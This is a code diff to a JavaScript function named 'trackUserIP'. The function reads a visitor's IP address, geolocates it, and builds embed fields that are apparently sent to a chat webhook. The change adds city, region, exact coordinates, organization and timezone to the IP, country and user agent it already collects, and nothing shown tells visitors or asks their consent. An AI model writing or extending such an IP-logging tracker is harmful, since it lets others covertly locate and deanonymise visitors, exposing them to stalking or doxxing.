@@ -6,10 +6,10 @@ export async function trackUserIP() {
     const ipData = await ipResponse.json();
     const userIP = ipData.ip;
     
-    const geoResponse = await fetch(`http://ip-api.com/json/${userIP}`);
+    const geoResponse = await fetch(`https://ipapi.co/${userIP}/json/`);
     const geoData = await geoResponse.json();
-    const country = geoData.country || 'Unknown';
-    const countryCode = geoData.countryCode || '??';
+    const country = geoData.country_name || 'Unknown';
+    const countryCode = geoData.country_code || '??';
     
     const timestamp = new Date().toISOString();
     const userAgent = navigator.userAgent;
@@ -27,13 +27,28 @@ export async function trackUserIP() {
             inline: true
           },
           {
+            name: "📍 Location",
+            value: `${geoData.city || 'Unknown'}, ${geoData.region || 'Unknown'}`,
+            inline: true
+          },
+          {
             name: "🏳️ Country",
             value: `${country} (${countryCode})`,
             inline: true
           },
           {
-            name: "📅 Timestamp",
-            value: timestamp,
+            name: "🌍 Coordinates",
+            value: geoData.latitude && geoData.longitude ? `${geoData.latitude}, ${geoData.longitude}` : 'Unknown',
+            inline: true
+          },
+          {
+            name: "🏢 Organization",
+            value: geoData.org || 'Unknown',
+            inline: true
+          },
+          {
+            name: "⏰ Timezone",
+            value: geoData.timezone || 'Unknown',
             inline: true
           },
           {
